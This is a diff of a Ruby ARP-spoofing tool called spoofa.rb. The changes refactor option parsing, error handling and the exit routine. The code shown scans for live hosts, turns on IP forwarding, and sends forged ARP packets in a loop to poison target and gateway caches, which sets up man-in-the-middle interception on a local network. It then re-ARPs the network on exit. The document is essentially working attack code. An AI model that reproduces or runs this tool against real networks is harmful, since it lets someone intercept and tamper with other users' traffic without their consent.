@@ -10,17 +10,14 @@ require 'ostruct'
 require 'ipaddr'
 
 # What mode are we running in?
+
 if ARGV.empty?
   interactive = true
-else # Parse the command-line options
-  unless ARGV.include?("-i")
-    puts "Interface is required. See spoofa.rb -h.\nTry again"
-    sleep 2 
-  exit 0
-  end
+else 
+begin
   options = OpenStruct.new
-  OptionParser.new do |opts|
-    opts.banner = "Usage: spoofa.rb # interactive mode\nUsage: spoofa.rb [-hmv] [-t target(s)] [-g gateway] -i interface # command-line mode"
+  optparse = OptionParser.new do |opts|
+    opts.banner = "Interactive mode:\tspoofa.rb\nCommand-line mode:\tspoofa.rb [-hmv] [-t target(s)] [-g gateway] -i interface"
     opts.separator ""
     opts.separator "Specific options:"
 
@@ -48,7 +45,18 @@ else # Parse the command-line options
       puts opts
       exit 0
     end
-  end.parse!
+  end
+  
+  # Parse the command-line options
+  optparse.parse! 
+  raise OptionParser::MissingArgument if options.interface.nil? # Is there a better way of doing this?
+  raise OptionParser::InvalidOption if options.gateway && !options.target
+  rescue OptionParser::MissingArgument, OptionParser::InvalidOption => e
+    puts "\n!!! Interface required !!!\n\n" if e.message =~ /argument/
+    puts "\n!!! Need target if gateway set !!!\n\n" if e.message =~ /option/
+    puts optparse
+    exit 0
+  end
 end
 
 #----------------------------------------------------------------------#
@@ -56,6 +64,9 @@ end
 
 def ip_check(ip)
   true if ip =~ /^(192|10|172)((\.)(25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9][0-9]|[0-9])){3}$/
+  rescue
+    puts "\n!!! Invalid IP #{ip} !!!"
+    neat_exit
 end
 
 def puts_verbose(text)
@@ -63,16 +74,21 @@ def puts_verbose(text)
 end
 
 def target_parse(target)
-  target = target.split(",")
-  @target = []                                          # Array of target ip's
-  @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
-  target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
-  target.each do |range|                                # Separate range(s) into start and end addresses
-    from  = range[/\A(\w*.){3}(\w*)/]     
-    to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
-    ip_from   = IPAddr.new(from)
-    ip_to     = IPAddr.new(to)
-    (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
+  begin
+    target = target.split(",")
+    @target = []                                          # Array of target ip's
+    @target = target.select {|ip| ip_check(ip)}           # Move single ips to @target
+    target.delete_if {|ip| ip_check(ip)}                  # Leaving range(s) in target
+    target.each do |range|                                # Separate range(s) into start and end addresses
+      from  = range[/\A(\w*.){3}(\w*)/]     
+      to    = range[/\A(\w*.){3}/] + range.split("-")[1]  
+      ip_from   = IPAddr.new(from)
+      ip_to     = IPAddr.new(to)
+      (ip_from..ip_to).each { |ip| @target << ip.to_s }   # Enter each value of range into @target
+    end
+  rescue
+    puts "\n!!! Invalid target #{target} !!!"
+    neat_exit
   end
 end
   
@@ -85,6 +101,7 @@ def build_pkt(dest_mac, source_ip, dest_ip, source_mac = @defaults[:eth_saddr], 
   @arp_pkt.arp_daddr_ip = dest_ip
 end 
 
+# Broadcast packets don't always work, best to directly target live hosts
 def target_scanner(targets, timeout)
   puts_verbose("Looking for live targets...")
   threads = []                                            # To keep track of the child processes/threads
@@ -99,28 +116,21 @@ def target_scanner(targets, timeout)
         @targets_hash[ip] = @target_mac                   # Make hash of target ips => target macs
       end
       GC.start
-      if @target_mac
-        puts_verbose "#{ip}: mac is #{@target_mac}"
-      else
-        puts_verbose "#{ip}: is down, can't spoof"
-      end
+      puts_verbose "#{ip} \tmac is #{@target_mac}" if @target_mac
     end
   end
   # Join on the child processes to allow them to finish
   # TODO Writing to hash should avoid need for this
-  threads.each do |thread|
-      thread.join
-  end
+  threads.each { |thread| thread.join }
+  
   @targets_hash.delete_if { |k, v| v.nil? }
-  @targets_hash.delete(@gateway) ###
-  puts
+  @targets_hash.delete(@gateway)
 end
 
-trap("INT") do 
+def neat_exit
   puts "\nRe-ARPing the network..."
   send_packets = false
   re_arp_pkts = []
-
   @targets_hash.each do |target, target_mac|
     build_pkt(target_mac, @gateway, target, @gateway_mac)
     re_arp_pkts << @arp_pkt
@@ -129,26 +139,26 @@ trap("INT") do
       re_arp_pkts << @arp_pkt
     end
   end
-  5.times do
-    re_arp_pkts.each do |pkt|
-      pkt.to_w(@iface)
-    end
+  3.times do
+    re_arp_pkts.each { |pkt| pkt.to_w(@iface) }
     sleep 1
   end
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
-  puts "...done."
+  puts "...done.\nExiting Spoofa"
   exit 0
 end
 
 #----------------------------------------------------------------------#
 # Let's set some defaults and variables
 
+trap("INT") { neat_exit }
+
 if interactive
   @verbose = true
 
   @defaults = PacketFu::Utils.ifconfig(Pcap.lookupdev)
   @iface = @defaults[:iface] 
-  print "Default interface appears to be #{@iface}.\nEnter to accept #{@iface}, or type an alternative: "
+  print "Default interface appears to be #{@iface}.\nEnter to accept, or type an alternative: "
   temp = gets.chomp
   unless temp.empty?
     @iface = temp
@@ -186,7 +196,7 @@ if interactive
     end
   end
 
-  print "Enter target IP(s): "
+  print "Enter target IP(s), separated by comma, or as a range: "
   target = gets.chomp
 
 # CL mode 
@@ -227,7 +237,7 @@ puts "#{var1}poofing #{var3} on #{@iface}, #{var2}"
 
 #----------------------------------------------------------------------#
 
-puts_verbose("\nObtaining mac addresses...")
+puts_verbose("\nLooking for gateway...")
 @gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface)
 unless @gateway_mac 
   (0..1).map { @gateway_mac = PacketFu::Utils::arp(@gateway, :iface => @iface) } # Try twice more, then exit.
@@ -235,23 +245,21 @@ unless @gateway_mac
   sleep 2
   exit 0 
 end
-puts_verbose "#{@gateway}: mac is #{@gateway_mac} (Gateway)"
+puts_verbose "#{@gateway} \tmac is #{@gateway_mac} (Gateway)"
 
 @targets_hash = {}
 @target_packets  = []
 @gateway_packets = []
 target_parse(target)
 target_scanner(@target, 2)
- ### need to tell self real gateway?
 
 # Make arrays of packets for targets and gateway
-# Args for build_pkt are: dest_mac, source_ip, dest_ip, op_code
-  @targets_hash.each do |target, target_mac|
-    build_pkt(target_mac, @gateway, target)
-    @target_packets << @arp_pkt
-  end
+@targets_hash.each do |target, target_mac|
+  build_pkt(target_mac, @gateway, target)
+  @target_packets << @arp_pkt
+end
 if @two_way
-  @targets_hash.each do |target, |
+  @targets_hash.each do |target, _|
     build_pkt(@gateway_mac, target, @gateway)
     @gateway_packets << @arp_pkt
   end
@@ -260,15 +268,10 @@ end
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
 send_packets = true
 while send_packets
-  print "Sending spoofing packets to"
-  @targets_hash.each do |target, |
-    print "; #{target} "
-  end
-  if @two_way
-    print "and gateway #{@gateway}"
-  end
-  puts
-  print "Packets sent: " if @verbose
+  print "\nSending spoofing packets to"
+  @targets_hash.each { |target, | print "; #{target} " }
+  print "and gateway #{@gateway}" if @two_way
+  print "\nPackets sent: " if @verbose
   count = 0
   while true
     @target_packets.each do |pkt|
